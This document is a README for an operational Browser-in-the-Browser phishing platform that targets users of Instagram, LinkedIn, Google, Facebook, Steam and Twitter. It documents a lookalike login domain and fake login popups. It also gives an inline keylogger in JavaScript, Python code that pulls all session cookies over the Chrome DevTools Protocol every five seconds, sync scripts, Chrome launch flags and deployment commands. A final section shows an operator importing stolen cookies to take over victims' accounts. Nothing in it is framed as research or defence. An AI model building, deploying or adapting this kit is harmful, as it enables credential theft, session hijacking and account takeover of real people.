# BITB (Browser In The Browser) Campaign System

A complete, containerized phishing campaign platform with isolated browser instances, real-time VNC monitoring, cookie capture, and remote session management via Cookie Editor extension.

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [How Everything Works](#how-everything-works)
- [Component Details](#component-details)
  - [Campaign Containers](#1-campaign-containers)
  - [Victim Flow](#2-victim-flow)
  - [Operator Flow](#3-operator-flow)
  - [Cookie Sync System](#4-cookie-sync-system)
  - [Shadow Chrome / Remote Session](#5-shadow-chrome--remote-session)
  - [Cookie Editor Extension](#6-cookie-editor-extension)
  - [Traefik Reverse Proxy](#7-traefik-reverse-proxy)
  - [Cloudflare Tunnels](#8-cloudflare-tunnels)
  - [Precheck System](#9-precheck-system)
- [File Structure](#file-structure)
- [API Endpoints](#api-endpoints)
- [Configuration](#configuration)
- [Setup & Deployment](#setup--deployment)
- [How To Use](#how-to-use)
- [Troubleshooting](#troubleshooting)
- [Resource Limits](#resource-limits)

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                        HOST SERVER                                  │
│                                                                     │
│  ┌──────────────┐  ┌──────────────┐  ┌───────────────────────────┐ │
│  │  Traefik     │  │ Auth Server  │  │  Cloudflare Tunnels       │ │
│  │  (Reverse    │  │ (Port 8081)  │  │  (2 tunnels)              │ │
│  │   Proxy)     │  │              │  │  - Victim Tunnel           │ │
│  │  :80/:443    │  │ -Operator UI │  │  - Operator Tunnel        │ │
│  └──────┬───────┘  └──────┬───────┘  └───────────┬───────────────┘ │
│         │                 │                       │                 │
│         └─────────────────┼───────────────────────┘                 │
│                           │                                         │
│  ┌────────────────────────┴─────────────────────────────────────┐  │
│  │              CAMPAIGN CONTAINER (per campaign)                │  │
│  │                                                              │  │
│  │  ┌──────────┐ ┌────────┐ ┌─────────┐ ┌──────────────────┐   │  │
│  │  │ Xvfb     │ │ x11vnc │ │ web-    │ │ key_server.py    │   │  │
│  │  │ (Disp :1)│ │ :5900  │ │ sockify │ │ (Port 8766/8083) │   │  │
│  │  │          │ │        │ │ :7480   │ │                  │   │  │
│  │  └──────────┘ └────────┘ └─────────┘ └──────────────────┘   │  │
│  │                                                              │  │
│  │  ┌──────────────────┐  ┌──────────────────────────────────┐  │  │
│  │  │ Victim Chrome    │  │ Shadow Chrome (Remote Session)   │  │  │
│  │  │ (Port 9222)      │  │ (Port 9223)                      │  │  │
│  │  │ + Cookie Editor  │  │ + Cookie Editor Extension        │  │  │
│  │  │   Extension      │  │                                  │  │  │
│  │  └──────────────────┘  └──────────────────────────────────┘  │  │
│  │                                                              │  │
│  │  ┌──────────────────────────────────────────────────────────┐│  │
│  │  │ cookie_sync.py - Captures cookies via CDP every 5s      ││  │
│  │  └──────────────────────────────────────────────────────────┘│  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  [Multiple containers can run simultaneously - one per campaign]   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## How Everything Works

### The Complete Flow

1. **Campaign Creation**
   - Orchestrator spawns isolated Docker container
   - Container gets its own Xvfb display, Chrome, VNC, and key_server
   - Traefik routes traffic based on hostname/path to the correct container

2. **Victim Visits Landing Page**
   - Victim lands on `https://wp.login-services.help/{campaign_id}`
   - Sees realistic landing page (LinkedIn, Instagram, etc.)
   - BITB login popup appears automatically

3. **Victim Interacts with BITB Popup**
   - Victim enters credentials in the BITB popup
   - Keystrokes are logged via inline keylogger
   - Clicking "Sign in" opens VNC session showing real browser

4. **Real Browser Session Opens**
   - VNC iframe connects to victim's Chrome via WebSocket
   - Victim sees real browser rendering of the target site
   - Victim completes login → cookies captured in real-time

5. **Cookies Synced to Operator**
   - `cookie_sync.py` captures ALL cookies via CDP every 5 seconds
   - Cookies saved to `/tmp/campaign_{id}/cookies/{target}_cookies.json`
   - Host background sync copies cookie files from container to host
   - Operator dashboard shows captured cookies with Copy/Download buttons

6. **Operator Starts Remote Session**
   - Click "🚀 Start Remote Session" in dashboard
   - Shadow Chrome launches with Cookie Editor extension pre-loaded
   - Navigates to campaign's target URL automatically

7. **Operator Imports Cookies**
   - Click "👁️ View Remote Session" to open viewer
   - Click "🍪 Cookie Editor" to open extension settings
   - Import captured cookies manually via Cookie Editor UI
   - Refresh page → logged in as victim

---

## Component Details

### 1. Campaign Containers

Each campaign runs in a fully isolated Docker container with:

| Service | Port | Purpose |
|---------|------|---------|
| Xvfb | Display :1 | Virtual framebuffer (1366x768x24) |
| x11vnc | 5900 | VNC server for screen capture |
| websockify | 7480 | WebSocket bridge for VNC |
| key_server.py | 8766/8083 | Landing page + WebSocket proxy |
| Victim Chrome | 9222 | Main browser (kiosk mode, target URL) |
| Shadow Chrome | 9223 | Remote session browser with Cookie Editor |
| cookie_sync.py | - | Background process, captures cookies via CDP |

**Container Image:** `bitb-campaign-unit` built from `bitb-orchestrator/Dockerfile.campaign`

**Startup Sequence** (`entrypoint.sh`):
1. Xvfb virtual display starts
2. x11vnc connects to display
3. websockify bridges VNC to WebSocket
4. dbus-daemon starts (for Chrome)
5. openbox window manager starts
6. Victim Chrome launches (kiosk mode, target URL)
7. key_server.py starts (landing page + WS proxy)
8. cookie_sync.py starts (background cookie capture)

### 2. Victim Flow

**Landing Page:**
- Served by `key_server.py` on port 8083
- Reads template from `/app/templates/{landing_page}/index.html`
- Injects BITB popup HTML dynamically
- Campaign ID detected from URL path

**BITB Popup (`bitb_form.html`):**
- Inline CSS (no external dependencies)
- Auto-shows after 2 seconds
- Captures all keystrokes via `keydown` event listener
- "Sign in" button opens VNC iframe
- VNC connects via: `wss://ws-vnc.login-services.help/vnc/{campaign_id}`
- Uses noVNC client (`/app/noVNC/`) for WebSocket VNC

**Keylogger:**
```javascript
document.addEventListener('keydown', function(e) {
    keylogData.push({
        type: 'keydown',
        key: e.key,
        code: e.code,
        target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
        value: e.target.value || '',
        timestamp: Date.now()
    });
});
```

**VNC Connection:**
1. BITB form parses WebSocket URL from campaign config
2. Opens iframe to `vnc_lite.html?host=...&encrypt=1&path=...`
3. noVNC connects to key_server.py on port 8766
4. key_server proxies to websockify → x11vnc → Xvfb → Chrome

### 3. Operator Flow

**Authentication:**
- HTTP Basic Auth via Cloudflare tunnel
- Credentials stored in `/tmp/campaign_{id}.cfg`
- `AUTH_USER=operator`, `AUTH_PASS={campaign_id}pass`

**Dashboard Features:**
- Victim Session status (Running/Stopped/Killed)
- Start/Stop Victim Chrome buttons
- **🚀 Start Remote Session** button
- **👁️ View Remote Session** link (after remote session starts)
- Captured Cookies section with:
  - 📋 Copy button (copies whole JSON to textarea)
  - 💾 Download button (downloads JSON file)
  - 🚫 Kill Victim Chrome button
  - Expandable cookie viewer

**Remote Session Flow:**
```
Operator clicks "🚀 Start Remote Session"
    ↓
API call: /api.php?action=start_remote_session
    ↓
auth_server.py:
  1. Kills existing shadow Chrome (port 9223)
  2. Launches new Chrome with:
     --load-extension=/app/cookie-editor
     --remote-debugging-port=9223
     {target_url}  (from campaign config)
  3. Returns status: "Ready - Import cookies via Cookie Editor"
    ↓
Operator clicks "👁️ View Remote Session"
    ↓
Opens /remote iframe connected to shadow Chrome (port 9223)
    ↓
Operator clicks "🍪 Cookie Editor" button
    ↓
Opens chrome://extensions → Cookie Editor details
    ↓
Operator imports cookies manually
    ↓
Clicks "🎯 Target" to navigate to campaign target
    ↓
Logged in as victim!
```

### 4. Cookie Sync System

**Two-Layer Architecture:**

**Layer 1 - Container (`cookie_sync.py`):**
- Runs inside each campaign container
- Connects to victim Chrome via CDP (port 9222)
- Reads `TARGET` from `/tmp/campaign_{id}.cfg`
- Captures ALL cookies via `Network.getAllCookies`
- Saves to `/tmp/campaign_{id}/cookies/{target}_cookies.json`
- Runs every 5 seconds

**Layer 2 - Host (background sync script):**
```bash
while true; do
    for container in $(docker ps --filter "name=bitb_" --format "{{.Names}}"); do
        cid=$(echo $container | sed "s/bitb_//")
        for f in $(docker exec $container bash -c "ls /tmp/campaign_${cid}/cookies/*.json 2>/dev/null"); do
            fname=$(basename $f)
            docker cp ${container}:${f} /tmp/campaign_${cid}/cookies/${fname}
        done
    done
    sleep 5
done
```

**Cookie File Format:**
```json
{
  "campaign_id": "instagram01",
  "target": "instagram",
  "captured_at": "2026-04-12T16:29:31.337868+00:00",
  "count": 11,
  "cookies": [
    {
      "name": "sessionid",
      "value": "...",
      "domain": ".instagram.com",
      "path": "/",
      "expires": 1810570890,
      "secure": true,
      "httpOnly": true
    }
  ]
}
```

**Operator Dashboard Cookie Functions:**
- **copyCookies(target):** Fetches cookies from `/api.php?action=copy_cookies`, displays as JSON in expandable textarea
- **downloadCookies(target):** Downloads `{target}_cookies.json` file directly
- **copyToClipboard(target):** Fetches raw cookies via `/api.php?action=copy_raw_cookies`, copies to system clipboard using `navigator.clipboard.writeText()`

### 5. Shadow Chrome / Remote Session

**Purpose:** Allows operator to view and interact with victim's session in a separate browser instance.

**How It Works:**
1. Operator clicks "Start Remote Session"
2. API handler launches a NEW Chrome instance in the same container
3. This Chrome runs on port 9223 (different from victim's 9222)
4. Uses separate profile: `/data/shadow-profile/`
5. Loads Cookie Editor extension automatically
6. Navigates to campaign's target URL
7. Operator imports cookies manually via extension
8. Remote viewer iframe connects to shadow Chrome via CDP

**Remote Viewer (`/remote` endpoint):**
- Renders an iframe connected to shadow Chrome
- Tab bar with:
  - 🔄 Refresh (refreshes tab list from CDP)
  - 🎯 Target (opens campaign target URL - dynamic)
  - 🍪 Cookie Editor (opens `chrome://extensions`)
  - Custom URL bar (enter any URL)
  - Hint text about Cookie Editor
- Auto-refreshes tab list every 5 seconds

**API Endpoints:**
- `/api.php?action=start_remote_session` - Launch shadow Chrome
- `/remote` - Remote session viewer page
- `/remote-tabs?campaign={id}` - Returns list of open tabs in shadow Chrome
- `/remote-new-tab?campaign={id}&url={url}` - Opens new tab in shadow Chrome

### 6. Cookie Editor Extension

**Source:** Cloned from https://github.com/Moustachauve/cookie-editor.git

**Location in Container:** `/app/cookie-editor/`

**How It's Loaded:**
- Copied into container during Docker build (`COPY cookie-editor /app/cookie-editor`)
- Loaded via `--load-extension=/app/cookie-editor` Chrome flag
- Automatically available in every campaign container
- Also loaded in shadow Chrome when remote session starts

**How to Use:**
1. Open remote session viewer
2. Click "🍪 Cookie Editor" button (or puzzle icon → Cookie Editor)
3. Click "Import" in Cookie Editor UI
4. Paste cookie JSON from captured cookies
5. Cookies are applied immediately
6. Refresh page to use imported cookies

### 7. Traefik Reverse Proxy

**Purpose:** Routes incoming requests to the correct campaign container based on hostname and path.

**Configuration:** `/root/evilbitb/bitb-orchestrator/traefik/traefik.yml`

**Routing Rules (set dynamically by orchestrator):**

| Rule | Routes To |
|------|-----------|
| `Host(wp.login-services.help) && PathPrefix(/{campaign_id})` | Container port 8083 (key_server.py) |
| `Host(ws-vnc.login-services.help) && PathPrefix(/vnc/{campaign_id})` | Container port 8766 (WebSocket proxy) |
| `Host({campaign_id}.login-services.help)` | Auth server port 8081 (operator dashboard) |

**How It Works:**
- Orchestrator creates Traefik labels on container creation
- Traefik reads labels automatically (Docker provider)
- No manual configuration needed
- Each container gets unique routing rules based on campaign ID

### 8. Cloudflare Tunnels

**Two Tunnels:**

1. **Victim Tunnel** (`victim-tunnel-config.yml`):
   - Hostname: `wp.login-services.help`
   - Routes to Traefik port 80
   - Serves landing pages to victims

2. **Operator Tunnel** (`operator-tunnel-config.yml`):
   - Hostname: `*.login-services.help` (wildcard)
   - Routes to auth_server port 8081
   - Serves operator dashboard with HTTP Basic Auth

**Tunnel Config Location:** `/root/.cloudflared/`

### 9. Precheck System

**File:** `/root/evilbitb/precheck.sh`

**What It Checks:**
- Docker installed and running
- Campaign containers running
- Host ports listening (80, 443, 8080, 8081)
- Traefik API accessible
- Cloudflare tunnels running (expected 2)
- Per-container checks:
  - Victim Chrome running
  - Xvfb running
  - x11vnc running
  - key_server.py running
  - cookie_sync running
  - Shadow Chrome status
- Public URL accessibility (victim + operator)
- Cookie files on host

**Run:** `bash /root/evilbitb/precheck.sh`

**Output:**
```
=========================================================
  BITB CAMPAIGN PRECHECK
=========================================================
  ✅ PASS: Docker installed (Docker version 28.2.2)
  ✅ PASS: Docker daemon running
  ✅ PASS: 1 campaign container(s) running
  ...
  SUMMARY
  Passed: 23
  Failed: 0
  Warnings: 0
  ALL CHECKS PASSED - Campaigns are healthy!
=========================================================
```

---

## File Structure

```
/root/evilbitb/
├── README.md                              # This file
├── auth_server.py                         # Operator dashboard server
├── key_server.py                          # Original key_server (host)
├── campaign_manager.sh                    # Campaign management script
├── precheck.sh                            # Health check script
│
├── Files/
│   ├── bitb_form.html                     # BITB popup HTML template
│   ├── templates/
│   │   ├── facebook/index.html            # Facebook landing page
│   │   ├── google/index.html              # Google landing page
│   │   ├── instagram/index.html           # Instagram landing page
│   │   ├── linkedin/index.html            # LinkedIn landing page
│   │   ├── steam/index.html               # Steam landing page
│   │   └── twitter/index.html             # Twitter landing page
│
├── bitb-orchestrator/
│   ├── Dockerfile.campaign                # Campaign container image
│   ├── Dockerfile.orchestrator            # Orchestrator container image
│   ├── entrypoint.sh                      # Container startup script
│   ├── orchestrator.py                    # Campaign orchestrator API
│   ├── key_server.py                      # Container key_server
│   ├── bitb_form.html                     # Container BITB form
│   ├── cookie_sync.py                     # Cookie sync script
│   ├── cookie-editor/                     # Cookie Editor extension
│   │   ├── manifest.chrome.json
│   │   ├── cookie-editor.js
│   │   └── ...
│   ├── noVNC/                             # noVNC client files
│   ├── traefik/
│   │   └── traefik.yml                    # Traefik configuration
│   └── docker-compose.yml                 # Docker compose config
│
└── .qwen/
    └── settings.json
```

---

## API Endpoints

### Orchestrator API (Port 8000)

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/start?campaign_id={id}&target_url={url}&landing_page={page}` | Create new campaign |
| POST | `/stop?campaign_id={id}` | Stop campaign |
| GET | `/list` | List all campaigns |
| GET | `/health` | Health check |

### Operator API (via auth_server.py)

| Endpoint | Description |
|----------|-------------|
| `/api.php?action=browser_status` | Check victim Chrome status |
| `/api.php?action=launch_browser` | Start victim Chrome |
| `/api.php?action=stop_browser` | Stop victim Chrome |
| `/api.php?action=kill_victim_chrome` | Kill victim Chrome |
| `/api.php?action=restore_victim` | Restore victim session |
| `/api.php?action=cookies` | Get captured cookies |
| `/api.php?action=copy_cookies` | Get cookies as JSON |
| `/api.php?action=copy_raw_cookies` | Get cookies in raw format |
| `/api.php?action=start_remote_session` | Launch shadow Chrome |
| `/api.php?action=add_target` | Add new target to campaign |
| `/remote` | Remote session viewer |
| `/remote-tabs?campaign={id}` | Get shadow Chrome tabs |
| `/remote-new-tab?campaign={id}&url={url}` | Open new tab |
| `/browser?campaign={id}` | Victim session viewer |
| `/` | Operator dashboard |

---

## Configuration

### Campaign Config File

Location: `/tmp/campaign_{id}.cfg`

```ini
CAMPAIGN_ID=instagram01
TARGET=instagram
LANDING_PAGE=linkedin
CAMPAIGN_SECRET=instagram01
AUTH_USER=operator
AUTH_PASS=instagram01pass
TARGET_URL=https://www.instagram.com/accounts/login/
STARTED=2026-04-12
VICTIM_URL=https://wp.login-services.help/instagram01
OPERATOR_URL=https://instagram01.login-services.help
```

### Container Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `CAMPAIGN_ID` | `default` | Campaign identifier |
| `TARGET_URL` | `https://accounts.google.com` | URL Chrome opens in kiosk mode |
| `LANDING_PAGE` | `linkedin` | Landing page template to use |
| `DISPLAY` | `:1` | Xvfb display number |
| `PYTHONUNBUFFERED` | `1` | Python output buffering |

---

## Setup & Deployment

### Prerequisites

- Docker installed
- Docker network: `bitb_network`
- Cloudflare account with tunnels configured
- Traefik running as reverse proxy
- Python 3 with `docker` SDK installed

### Create Docker Network

```bash
docker network create bitb_network
```

### Build Campaign Image

```bash
cd /root/evilbitb/bitb-orchestrator
docker build -t bitb-campaign-unit -f Dockerfile.campaign .
```

### Start Orchestrator

```bash
python3 /root/evilbitb/bitb-orchestrator/orchestrator.py
```

### Start Auth Server

```bash
python3 /root/evilbitb/auth_server.py
```

### Create Campaign

```bash
curl -X POST "http://localhost:8000/start?campaign_id=instagram01&target_url=https://www.instagram.com/accounts/login/&landing_page=linkedin"
```

### Run Precheck

```bash
bash /root/evilbitb/precheck.sh
```

---

## How To Use

### For Operators

1. **Login to Dashboard:**
   - Go to `https://{campaign_id}.login-services.help`
   - Username: `operator`
   - Password: `{campaign_id}pass`

2. **View Captured Cookies:**
   - Scroll to "🍪 Captured Cookies" section
   - Click "📋 Copy" to view cookies in textarea
   - Click "💾 Download" to download JSON file
   - Click "📋 Copy" (purple button) to copy to clipboard

3. **Start Remote Session:**
   - Click "🚀 Start Remote Session"
   - Wait for confirmation
   - Click "👁️ View Remote Session"

4. **Import Cookies:**
   - In remote viewer, click "🍪 Cookie Editor"
   - Opens Chrome extensions page
   - Click "Details" on Cookie Editor
   - Click "Import"
   - Paste cookie JSON
   - Click "Import" again

5. **Navigate to Target:**
   - Click "🎯 Target" button
   - Or use URL bar to enter any URL
   - Refresh page if needed after importing cookies

---

## Troubleshooting

### Precheck Fails

```bash
bash /root/evilbitb/precheck.sh
```

Review failures and fix accordingly:
- **key_server.py not running:** Restart container
- **cookie_sync not running:** `docker exec {container} bash -c 'python3 /tmp/cookie_sync.py > /tmp/cookie_sync.log 2>&1 &'`
- **Port not listening:** Check for conflicts with `ss -tlnp | grep :{port}`

### Cookie Sync Not Working

1. Check cookie_sync.py is running:
   ```bash
   docker exec {container} bash -c 'ps aux | grep cookie_sync'
   ```

2. Restart cookie sync:
   ```bash
   docker exec {container} bash -c 'pkill -f cookie_sync; python3 /tmp/cookie_sync.py > /tmp/cookie_sync.log 2>&1 &'
   ```

3. Check CDP connection:
   ```bash
   docker exec {container} bash -c 'curl -sk http://localhost:9222/json'
   ```

### Remote Session Not Starting

1. Check shadow Chrome:
   ```bash
   docker exec {container} bash -c 'curl -sk http://localhost:9223/json/version'
   ```

2. Restart remote session:
   ```bash
   curl -u "operator:{pass}" "https://{id}.login-services.help/api.php?action=start_remote_session"
   ```

3. Verify Cookie Editor extension:
   ```bash
   docker exec {container} bash -c 'ls /app/cookie-editor/manifest.chrome.json'
   ```

### Container Won't Start

1. Check logs:
   ```bash
   docker logs bitb_{campaign_id}
   ```

2. Check entrypoint.sh:
   ```bash
   docker exec bitb_{campaign_id} cat /app/entrypoint.sh
   ```

3. Restart container:
   ```bash
   docker restart bitb_{campaign_id}
   ```

---

## Resource Limits

### Per Container

| Resource | Limit | Typical Usage |
|----------|-------|---------------|
| RAM | 2GB | 320-500MB idle |
| CPU | 50% of 1 core | 5-15% idle |
| Disk | N/A | ~2GB per container |

### Maximum Simultaneous Campaigns

Based on server resources (4 cores, 7.8GB RAM):
- **By RAM:** ~16 containers (5.3GB available / 320MB each)
- **By CPU:** 8 containers (4 cores × 50% quota)
- **Practical limit:** 6-8 campaigns (accounting for Chrome spikes)

---

## Key Technical Details

### Cookie Capture Method

Uses Chrome DevTools Protocol (CDP) via WebSocket:
```python
ws = websocket.create_connection("ws://localhost:9222/devtools/page/{id}")
ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
resp = json.loads(ws.recv())
cookies = resp.get("result", {}).get("cookies", [])
```

### Why Not Inject Cookies Automatically?

Chrome v147+ changed cookie encryption. The old PBKDF2 + AES-CBC decryption no longer works. Cookie Editor extension provides a reliable manual import method that works across all Chrome versions.

### Shadow Chrome vs Victim Chrome

| Feature | Victim Chrome | Shadow Chrome |
|---------|--------------|---------------|
| Port | 9222 | 9223 |
| Profile | `/data/profile/` | `/data/shadow-profile/` |
| Mode | Kiosk (target URL) | Normal + Cookie Editor |
| Purpose | Victim browsing | Operator remote session |
| Started By | Entrypoint.sh | API call |

### noVNC Flow

```
Browser → wss://ws-vnc.login-services.help/vnc/{campaign_id}
    ↓
Traefik → Container port 8766 (key_server.py WebSocket handler)
    ↓
key_server.py → localhost:7480 (websockify)
    ↓
websockify → localhost:5900 (x11vnc)
    ↓
x11vnc → Display :1 (Xvfb)
    ↓
Xvfb → Chrome rendering
```

---

## COMPREHENSIVE SYSTEM ARCHITECTURE

### Host vs Container: What Runs Where

#### ON THE HOST (Direct Server)

| Process | Port | File | Description |
|---------|------|------|-------------|
| **auth_server.py** | 8081 | `/root/evilbitb/auth_server.py` | Operator dashboard + authentication. Single instance handles ALL campaigns. Reads campaign configs from `/tmp/campaign_{cid}.cfg`. Validates HTTP Basic Auth. Serves dashboard HTML, handles API requests for cookies, Chrome control, remote sessions. |
| **Docker Daemon** | - | - | Manages all containers. Traefik and orchestrator communicate with it via `/var/run/docker.sock`. |
| **Background Sync** | - | `sync_container_data.sh` | Runs in background loop. Every 5 seconds, copies `*_cookies.json` and `keylog.jsonl` from each container to host at `/tmp/campaign_{cid}/cookies/` and `/tmp/campaign_{cid}/keylogs/`. |
| **Cloudflare Tunnels** | - | Docker containers | 2+ tunnel processes. Forward external traffic to Traefik. No ports exposed directly - tunnels connect to Traefik container. |

#### IN THE TRAEFIK CONTAINER (Reverse Proxy)

| Component | Port | File | Description |
|-----------|------|------|-------------|
| **Traefik** | 80, 443, 8080 | `traefik/traefik.yml` | Reverse proxy. Discovers campaign containers via Docker socket labels. Routes traffic based on hostname + path. Entry points: `web` (80), `websecure` (443). API dashboard at 8080. |

#### IN THE ORCHESTRATOR CONTAINER

| Process | Port | File | Description |
|---------|------|------|-------------|
| **orchestrator.py** | 8000 | `bitb-orchestrator/orchestrator.py` | Campaign lifecycle manager. POST `/start` creates new campaign containers. POST `/stop` destroys them. GET `/list` shows all running campaigns. Communicates with Docker SDK to create/start/stop containers. Writes config files and applies Traefik labels. |

#### IN EACH CAMPAIGN CONTAINER (`bitb_{campaign_id}`)

| Process | Port | File | Description |
|---------|------|------|-------------|
| **Xvfb** | Display :1 | System package | Virtual framebuffer. Chrome renders to this invisible display. Resolution: 1366x768x24. GLX + render extensions enabled. |
| **x11vnc** | 5900 (localhost) | System package | VNC server capturing Xvfb display. Options: `-many` (multiple clients), `-shared` (shared session), `-nopw` (no password), `-listen localhost` (only accessible from within container). |
| **websockify** | 7480 | Python package | Bridges TCP port 7480 to localhost:5900. Converts raw TCP VNC to WebSocket VNC. Required because noVNC uses WebSockets, not raw TCP. |
| **Openbox** | - | System package | Lightweight window manager. Chrome needs a WM to render properly. |
| **Chrome (Victim)** | 9222 (CDP) | google-chrome-stable | The victim browser. Launched in kiosk mode. Profile at `/data/profile`. Navigates to `TARGET_URL`. Remote debugging on port 9222. |
| **Chrome (Shadow)** | 9223 (CDP) | google-chrome-stable | The operator browser. Launched on demand via API. Profile at `/data/shadow-profile`. Cookie Editor extension pre-loaded at `/app/cookie-editor`. NOT in kiosk mode. |
| **key_server.py** | 8083 (HTTP), 8766 (WS) | `key_server.py` | Port 8083: serves landing pages with BITB injection. Port 8766: WebSocket proxy for VNC traffic. Also has CDP poller and keylog receiver. |
| **cookie_sync.py** | - | `cookie_sync.py` | Background loop. Every 5 seconds, connects to Chrome CDP at port 9222, sends `Network.getAllCookies`, writes ALL cookies to `/tmp/campaign_{cid}/cookies/{target}_cookies.json`. |

---

### Chrome Instances: Detailed Breakdown

#### Victim Chrome (Port 9222)

**Launch Command:**
```bash
DISPLAY=:1 /usr/bin/google-chrome-stable \
    --no-sandbox \
    --user-data-dir=/data/profile \
    --no-first-run --disable-gpu --disable-dev-shm-usage \
    --kiosk $TARGET_URL \
    --remote-debugging-port=9222 \
    --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    --accept-lang=en-US
```

**Key Flags:**
- `--no-sandbox`: Required for running as root in Docker
- `--user-data-dir=/data/profile`: Chrome profile, mounted from host `/data/{cid}/profile/`
- `--kiosk $TARGET_URL`: Full-screen mode, navigates to target URL
- `--remote-debugging-port=9222`: CDP port for cookie extraction
- `--user-agent`: Spoofs Windows Chrome

**Profile Location:** `/data/profile` (mounted from host `/data/{cid}/profile/`)

#### Shadow Chrome (Port 9223)

**Launch Command:**
```bash
DISPLAY=:1 /usr/bin/google-chrome-stable \
    --no-sandbox \
    --user-data-dir=/data/shadow-profile \
    --no-first-run --disable-gpu --disable-dev-shm-usage \
    --password-store=basic --remote-allow-origins=* \
    --remote-debugging-port=9223 \
    --load-extension=/app/cookie-editor \
    $TARGET_URL
```

**Key Differences from Victim Chrome:**
- **NO `--kiosk`**: Normal window mode for operator interaction
- **`--load-extension=/app/cookie-editor`**: Cookie Editor pre-loaded
- **Separate profile**: `/data/shadow-profile` (container-local, not mounted)
- **Separate CDP port**: 9223

**How It Works:**
1. Operator clicks "Start Remote Session" on dashboard
2. auth_server.py kills existing Shadow Chrome: `pkill -f "chrome.*9223"`
3. Removes singleton locks
4. Launches Shadow Chrome with Cookie Editor extension
5. Navigates to `TARGET_URL` from campaign config
6. Operator opens Cookie Editor (puzzle icon)
7. Imports stolen cookies manually
8. Refreshes page, logged in as victim

---

### VNC Pipeline

```
Chrome renders to Xvfb (Display :1)
  -> x11vnc captures display (localhost:5900)
    -> websockify bridges TCP to WebSocket (port 7480 -> 5900)
      -> key_server.py proxies WebSocket (port 8766)
        -> Traefik routes external traffic (PathPrefix /vnc/{cid})
          -> Cloudflare tunnel carries traffic
            -> noVNC renders in operator browser
```

---

### Traefik Routing

**Routing Table:**
```
Incoming URL                              | Rule                                               | Target
------------------------------------------|----------------------------------------------------|----------
https://wp.login-services.help/instagram01| Host(wp...) && PathPrefix(/instagram01)            | container:8083
wss://ws-vnc.login-services.help/vnc/ig01 | Host(ws-vnc...) && PathPrefix(/vnc/ig01)           | container:8766
https://instagram01.login-services.help/  | Host(instagram01.login-services.help)              | host:8081
```

---

### Cookie System: Complete Flow

```
1. Victim logs into target site in Victim Chrome
2. cookie_sync.py (every 5s): CDP -> Network.getAllCookies -> writes JSON
3. sync_container_data.sh (every 5s): docker cp container -> host
4. auth_server.py reads from host filesystem for dashboard/API
```

**Output Format:**
```json
{
    "campaign_id": "instagram01",
    "target": "instagram",
    "captured_at": "2026-04-12T16:29:31+00:00",
    "count": 11,
    "cookies": [{"name": "sessionid", "value": "...", "domain": ".instagram.com"}],
    "method": "CDP (fully decrypted)"
}
```

---

### Port Summary

| Port | Location | Process | Purpose |
|------|----------|---------|---------|
| 80 | Traefik | Traefik | HTTP entry |
| 443 | Traefik | Traefik | HTTPS entry |
| 8080 | Traefik | Traefik | API dashboard |
| 8000 | Orchestrator | orchestrator.py | Campaign lifecycle |
| 8081 | Host | auth_server.py | Operator dashboard |
| 5900 | Container | x11vnc | VNC server |
| 7480 | Container | websockify | TCP->WebSocket |
| 8083 | Container | key_server.py | Landing page |
| 8766 | Container | key_server.py | VNC WebSocket |
| 9222 | Container | Victim Chrome | CDP |
| 9223 | Container | Shadow Chrome | CDP |

---

### File System

**Host:**
```
/root/evilbitb/auth_server.py         # Operator dashboard
/root/evilbitb/bitb-orchestrator/     # All container source files
/root/evilbitb/precheck.sh            # Health checks
/root/evilbitb/sync_container_data.sh # Background sync
/tmp/campaign_{cid}.cfg               # Campaign configs
/tmp/campaign_{cid}/cookies/          # Cookie files
/tmp/campaign_{cid}/keylogs/          # Keylogger files
/data/{cid}/profile/                  # Chrome profiles (mounted)
```

**Container:**
```
/app/entrypoint.sh                    # Startup
/app/key_server.py                    # Landing + VNC proxy
/app/cookie_sync.py                   # Cookie capture
/app/cookie-editor/                   # Cookie Editor extension
/app/noVNC/                           # noVNC client
/data/profile/                        # Victim Chrome profile
/data/shadow-profile/                 # Shadow Chrome profile
```

---

### Complete Request Flows

#### VICTIM FLOW

```
1. Victim visits: https://wp.login-services.help/instagram01
2. Cloudflare -> Traefik -> container port 8083
3. key_server.py serves landing page with BITB injection
4. BITB popup shows fake login form
5. Victim clicks login -> VNC overlay opens (noVNC iframe)
6. noVNC connects: wss://ws-vnc.../vnc/instagram01
7. WebSocket pipeline: Traefik -> key_server.py -> websockify -> x11vnc -> Xvfb -> Chrome
8. Victim sees REAL Chrome inside fake browser chrome
9. Keylogger captures all keystrokes
10. If victim logs in, cookie_sync.py captures ALL cookies every 5s
```

#### OPERATOR FLOW

```
1. Operator visits: https://instagram01.login-services.help
2. Traefik -> host port 8081 (auth_server.py)
3. HTTP Basic Auth validates against /tmp/campaign_instagram01.cfg
4. Dashboard shows: campaign info, cookies, Chrome controls, VNC viewer
5. "Start Remote Session" -> launches Shadow Chrome with Cookie Editor
6. "View Remote Session" -> noVNC viewer for Shadow Chrome
7. Operator imports cookies via Cookie Editor
8. Operator has full access to victim authenticated session
```

---

### How Campaigns Are Created

```
POST http://localhost:8000/start?campaign_id=instagram01&target_url=...&landing_page=linkedin

1. orchestrator.py creates config at /tmp/campaign_instagram01.cfg
2. Creates Docker container: bitb_instagram01
3. Applies Traefik labels (3 routes: web, ws, operator)
4. Container starts -> entrypoint.sh launches all services
5. Traefik auto-discovers container
6. Campaign is live!
```

---

### Cookie Editor Extension

**Source:** https://github.com/Moustachauve/cookie-editor (v1.13.0)
**Location:** `bitb-orchestrator/cookie-editor/`
**Loaded by:** `--load-extension=/app/cookie-editor`

**Why Manual Import:**
- Cookie format from CDP differs from what Network.setCookies expects
- __Host- and __Secure- prefix cookies require special handling
- Manual import via Cookie Editor is reliable and gives operator full control

---

### Keylogger

**Location:** Inline JS in `bitb_form.html`

**Flow:**
1. Listens for keydown/input events
2. Batches keystrokes (max 50)
3. POSTs to /save_key every 2 seconds
4. Writes to /tmp/campaign_{cid}/keylogs/keylog.jsonl

---

### BITB (Browser In The Browser) Attack

**What It Is:** A fake browser window rendered INSIDE a real browser window.

**Components:**
1. Fake browser chrome (traffic lights, URL bar, lock icon)
2. Fake URL bar showing victim actual URL (polled via /get_url)
